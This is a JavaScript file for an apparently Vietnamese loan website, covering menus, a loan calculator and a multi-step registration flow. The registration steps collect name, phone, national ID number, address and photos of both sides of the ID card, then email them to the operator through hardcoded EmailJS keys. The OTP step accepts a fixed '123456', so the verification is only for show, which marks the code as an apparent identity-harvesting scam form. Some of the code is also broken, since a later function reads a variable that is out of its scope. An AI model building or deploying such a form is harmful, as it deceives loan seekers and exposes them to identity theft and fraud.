document.addEventListener('DOMContentLoaded', () => {
    // Khởi tạo EmailJS
    emailjs.init('c-Ms5MjWbitpDBb-E');

    // Biến lưu trữ dữ liệu đăng ký
    let registrationData = {};

    // Chuyển đổi ảnh thành base64
    function getBase64(file) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = () => resolve(reader.result);
            reader.onerror = error => reject(error);
        });
    }

    // Gắn sự kiện cho nút "Đăng ký ngay"
    document.querySelectorAll('.register-now-btn').forEach(button => {
        button.addEventListener('click', showRegisterForm);
    });

    // Gắn sự kiện cho nút "Tính khoản vay"
    document.querySelectorAll('.calculate-loan-btn').forEach(button => {
        button.addEventListener('click', showLoanCalculator);
    });

    // Gắn sự kiện cho menu
    document.querySelector('.hamburger').addEventListener('click', () => {
        document.querySelector('.menu-items').classList.toggle('hidden');
        document.querySelector('.menu-items').classList.toggle('active');
    });

    document.querySelector('.close-menu').addEventListener('click', () => {
        document.querySelector('.menu-items').classList.toggle('hidden');
        document.querySelector('.menu-items').classList.toggle('active');
    });

    document.querySelectorAll('.menu-link').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const target = link.getAttribute('data-target');
            document.querySelectorAll('.content-section').forEach(section => section.classList.remove('active'));
            document.querySelector(`#${target}`).classList.add('active');
            document.querySelector('#register-form').classList.add('hidden');
            document.querySelector('#loan-calculator-modal').classList.add('hidden');
            document.querySelector('#loan-approval').classList.add('hidden');
            document.querySelector('.menu-items').classList.add('hidden');
            document.querySelector('.menu-items').classList.remove('active');
        });
    });

    // Partner Logos
    document.querySelectorAll('.partner-logo').forEach(logo => {
        logo.addEventListener('click', () => {
            const partner = logo.getAttribute('data-partner');
            document.querySelectorAll('.partner-details p').forEach(detail => detail.classList.remove('active'));
            document.querySelector(`#${partner}-detail`).classList.add('active');
        });

        logo.addEventListener('mouseover', () => {
            const partner = logo.getAttribute('data-partner');
            document.querySelectorAll('.partner-details p').forEach(detail => detail.classList.remove('active'));
            document.querySelector(`#${partner}-detail`).classList.add('active');
        });
    });

    // Slider cho Testimonials và Promotions
    function initSlider(sliderClass, prevBtn, nextBtn) {
        const slider = document.querySelector(sliderClass);
        const items = slider.querySelectorAll('.slider-item');
        let currentIndex = 0;

        function showSlide(index) {
            items.forEach(item => item.style.display = 'none');
            items[index].style.display = 'flex';
        }

        showSlide(currentIndex);

        document.querySelector(prevBtn).addEventListener('click', () => {
            currentIndex = (currentIndex - 1 + items.length) % items.length;
            showSlide(currentIndex);
        });

        document.querySelector(nextBtn).addEventListener('click', () => {
            currentIndex = (currentIndex + 1) % items.length;
            showSlide(currentIndex);
        });

        setInterval(() => {
            currentIndex = (currentIndex + 1) % items.length;
            showSlide(currentIndex);
        }, parseInt(slider.getAttribute('data-autoscroll-interval')));
    }

    initSlider('.slider', '[data-slider-prev]', '[data-slider-next]');
    initSlider('.promo-slider', '[data-promo-slider-prev]', '[data-promo-slider-next]');

    // Zoom cho ảnh hợp đồng
    mediumZoom('[data-zoomable]');

    // Form Đăng ký
    document.querySelector('#loanFormStep1').addEventListener('submit', function(e) {
        e.preventDefault();
        registrationData.loanAmount = document.querySelector('#loanAmountStep1').value;
        registrationData.loanTerm = document.querySelector('#loanTermStep1').value;
        document.querySelector('#register-step-1').classList.add('hidden');
        document.querySelector('#register-step-2').classList.remove('hidden');
    });

    document.querySelector('#loanFormStep2').addEventListener('submit', function(e) {
        e.preventDefault();

        registrationData.fullName = document.querySelector('#fullName').value;
        registrationData.phone = document.querySelector('#phone').value;
        registrationData.email = document.querySelector('#email').value;
        registrationData.idNumber = document.querySelector('#idNumber').value;
        registrationData.loanType = document.querySelector('#loanType').value;
        registrationData.address = document.querySelector('#address').value;
        registrationData.accountName = document.querySelector('#accountName').value;

        emailjs.send('service_ytsr91e', 'template_gwserzi', {
            fullName: registrationData.fullName,
            phone: registrationData.phone,
            email: registrationData.email,
            idNumber: registrationData.idNumber,
            loanAmount: registrationData.loanAmount,
            loanTerm: registrationData.loanTerm,
            loanType: registrationData.loanType,
            idPhoto: '',
            atmPhoto: '',
            message: 'Chúng tôi đã nhận được thông tin đăng ký của bạn. Vui lòng hoàn tất các bước tiếp theo.'
        })
        .then(() => {
            document.querySelector('#register-notification').textContent = 'Thông tin đã được gửi qua email!';
            document.querySelector('#register-notification').style.color = 'green';
            document.querySelector('#register-step-2').classList.add('hidden');
            document.querySelector('#register-step-3').classList.remove('hidden');
        })
        .catch(error => {
            console.error('Lỗi gửi email:', error);
            document.querySelector('#register-notification').textContent = 'Có lỗi xảy ra khi gửi email. Vui lòng thử lại.';
            document.querySelector('#register-notification').style.color = 'red';
        });
    });

    document.querySelector('#loanFormStep3').addEventListener('submit', function(e) {
        e.preventDefault();
        const otp = document.querySelector('#otp').value;
        if (otp === '123456') { // OTP giả lập
            document.querySelector('#otp-notification').textContent = 'Xác thực thành công!';
            document.querySelector('#otp-notification').style.color = 'green';
            setTimeout(() => {
                document.querySelector('#register-step-3').classList.add('hidden');
                document.querySelector('#register-step-4').classList.remove('hidden');
            }, 1000);
        } else {
            document.querySelector('#otp-error').textContent = 'Mã OTP không đúng. Vui lòng thử lại.';
        }
    });

    document.querySelector('#loanFormStep4').addEventListener('submit', async function(e) {
        e.preventDefault();

        const cccdFrontFile = document.querySelector('#cccdFront').files[0];
        const cccdBackFile = document.querySelector('#cccdBack').files[0];

        if (cccdFrontFile && cccdBackFile) {
            try {
                registrationData.cccdFrontBase64 = await getBase64(cccdFrontFile);
                registrationData.cccdBackBase64 = await getBase64(cccdBackFile);

                document.querySelector('#cccdFront-preview').innerHTML = `<img src="${registrationData.cccdFrontBase64}" alt="CCCD mặt trước" class="w-full max-w-[200px] mx-auto">`;
                document.querySelector('#cccdBack-preview').innerHTML = `<img src="${registrationData.cccdBackBase64}" alt="CCCD mặt sau" class="w-full max-w-[200px] mx-auto">`;

                document.querySelector('#cccdFront-confirm-img').src = registrationData.cccdFrontBase64;
                document.querySelector('#cccdBack-confirm-img').src = registrationData.cccdBackBase64;

                document.querySelector('#register-step-4').classList.add('hidden');
                document.querySelector('#register-step-5').classList.remove('hidden');
            } catch (error) {
                console.error('Lỗi chuyển đổi ảnh:', error);
            }
        }
    });

    // Form Tính khoản vay
    document.querySelector('#calculatorForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const loanAmount = parseFloat(document.querySelector('#calcLoanAmount').value);
        const loanTerm = parseInt(document.querySelector('#calcLoanTerm').value);
        const loanType = document.querySelector('#calcLoanType').value;

        let interestRate;
        if (loanType === 'Vay tiêu dùng') {
            interestRate = 18;
        } else if (loanType === 'Vay mua xe') {
            interestRate = 5.89;
        } else {
            interestRate = 0;
        }

        const monthlyInterestRate = interestRate / 100 / 12;
        const monthlyPayment = (loanAmount * monthlyInterestRate) / (1 - Math.pow(1 + monthlyInterestRate, -loanTerm));

        document.querySelector('#calcInterestRate').textContent = interestRate.toFixed(2);
        document.querySelector('#calcMonthlyPayment').textContent = monthlyPayment.toFixed(2);
        document.querySelector('#calcResult').style.display = 'block';
    });

    // Form Liên hệ
    document.querySelector('#contactForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const contactName = document.querySelector('#contactName').value;
        const contactEmail = document.querySelector('#contactEmail').value;
        const contactMessage = document.querySelector('#contactMessage').value;

        emailjs.send('service_ytsr91e', 'template_gwserzi', {
            fullName: contactName,
            email: contactEmail,
            message: contactMessage
        })
        .then(() => {
            document.querySelector('#contact-notification').textContent = 'Tin nhắn đã được gửi thành công!';
            document.querySelector('#contact-notification').style.color = 'green';
            this.reset();
        })
        .catch(error => {
            console.error('Lỗi gửi email:', error);
            document.querySelector('#contact-notification').textContent = 'Có lỗi xảy ra khi gửi tin nhắn. Vui lòng thử lại.';
            document.querySelector('#contact-notification').style.color = 'red';
        });
    });

    // Contract Carousel
    const contractPages = document.querySelectorAll('.contract-page');
    let currentContractPage = 0;

    function showContractPage(index) {
        contractPages.forEach(page => page.style.display = 'none');
        contractPages[index].style.display = 'block';
        document.querySelector('#contract-page-number').textContent = index + 1;
    }

    showContractPage(currentContractPage);

    document.querySelector('#contract-prev').addEventListener('click', () => {
        currentContractPage = (currentContractPage - 1 + contractPages.length) % contractPages.length;
        showContractPage(currentContractPage);
    });

    document.querySelector('#contract-next').addEventListener('click', () => {
        currentContractPage = (currentContractPage + 1) % contractPages.length;
        showContractPage(currentContractPage);
    });

    // Tải hợp đồng PDF
    document.querySelector('#download-contract-step1').addEventListener('click', async () => {
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();
        const img = new Image();
        img.src = contractPages[currentContractPage].src;
        img.onload = () => {
            doc.addImage(img, 'PNG', 10, 10, 190, 0);
            doc.save('contract.pdf');
        };
    });

    // Loan Approval Steps
    document.querySelector('#approvalFormStep4').addEventListener('submit', function(e) {
        e.preventDefault();
        const otp = document.querySelector('#approval-otp').value;
        if (otp === '123456') {
            document.querySelector('#otp-approval-notification').textContent = 'Xác thực thành công!';
            document.querySelector('#otp-approval-notification').style.color = 'green';
            setTimeout(() => {
                document.querySelector('#approval-step-4').classList.add('hidden');
                document.querySelector('#approval-step-5').classList.remove('hidden');
            }, 1000);
        } else {
            document.querySelector('#approval-otp-error').textContent = 'Mã OTP không đúng. Vui lòng thử lại.';
        }
    });
});

// Hàm hiển thị form đăng ký
function showRegisterForm() {
    const registerForm = document.querySelector('#register-form');
    const contentSections = document.querySelectorAll('.content-section');

    contentSections.forEach(section => section.classList.remove('active'));
    registerForm.classList.remove('hidden');
}

// Hàm hiển thị modal tính khoản vay
function showLoanCalculator() {
    const loanCalculatorModal = document.querySelector('#loan-calculator-modal');
    const contentSections = document.querySelectorAll('.content-section');

    contentSections.forEach(section => section.classList.remove('active'));
    loanCalculatorModal.classList.remove('hidden');
}

// Hàm đóng modal tính khoản vay
function closeLoanCalculator() {
    document.querySelector('#loan-calculator-modal').classList.add('hidden');
    document.querySelector('#home-content').classList.add('active');
}

// Hàm reset form tính khoản vay
function resetCalculatorForm() {
    document.querySelector('#calculatorForm').reset();
    document.querySelector('#calcResult').style.display = 'none';
}

// Hàm quay lại trang chủ
function showHome() {
    document.querySelectorAll('.content-section').forEach(section => section.classList.remove('active'));
    document.querySelector('#home-content').classList.add('active');
    document.querySelector('#register-form').classList.add('hidden');
    document.querySelector('#loan-calculator-modal').classList.add('hidden');
    document.querySelector('#loan-approval').classList.add('hidden');
}

// Hàm chuyển bước trong form đăng ký
function nextStep(step) {
    document.querySelector(`#register-step-${step}`).classList.add('hidden');
    document.querySelector(`#register-step-${step + 1}`).classList.remove('hidden');
}

function prevStep(step) {
    document.querySelector(`#register-step-${step}`).classList.add('hidden');
    document.querySelector(`#register-step-${step - 1}`).classList.remove('hidden');
}

// Hàm gửi đăng ký và email xác nhận
function submitRegistration() {
    const tempPassword = document.querySelector('#temp-password').textContent;

    emailjs.send('service_ytsr91e', 'template_gwserzi', {
        fullName: registrationData.fullName,
        phone: registrationData.phone,
        email: registrationData.email,
        idNumber: registrationData.idNumber,
        loanAmount: registrationData.loanAmount,
        loanTerm: registrationData.loanTerm,
        loanType: registrationData.loanType,
        idPhoto: registrationData.cccdFrontBase64,
        atmPhoto: registrationData.cccdBackBase64,
        temp_password: tempPassword
    })
    .then(() => {
        document.querySelector('#register-step-5').classList.add('hidden');
        document.querySelector('#register-step-6').classList.remove('hidden');
        document.querySelector('#success-account-name').textContent = registrationData.accountName;
    })
    .catch(error => {
        console.error('Lỗi gửi email:', error);
        alert('Có lỗi xảy ra khi gửi email xác nhận. Vui lòng kiểm tra lại.');
    });
}

// Hàm chuyển bước trong Loan Approval
function nextApprovalStep(step) {
    document.querySelector(`#approval-step-${step}`).classList.add('hidden');
    document.querySelector(`#approval-step-${step + 1}`).classList.remove('hidden');
    document.querySelector('#approval-progress').style.width = `${(step + 1) * 20}%`;
}

function prevApprovalStep(step) {
    document.querySelector(`#approval-step-${step}`).classList.add('hidden');
    document.querySelector(`#approval-step-${step - 1}`).classList.remove('hidden');
    document.querySelector('#approval-progress').style.width = `${(step - 1) * 20}%`;
}

function showApprovalStep(step) {
    document.querySelectorAll('.approval-step').forEach(s => s.classList.add('hidden'));
    document.querySelector(`#approval-step-${step}`).classList.remove('hidden');
    document.querySelector('#approval-progress').style.width = `${step * 20}%`;
}
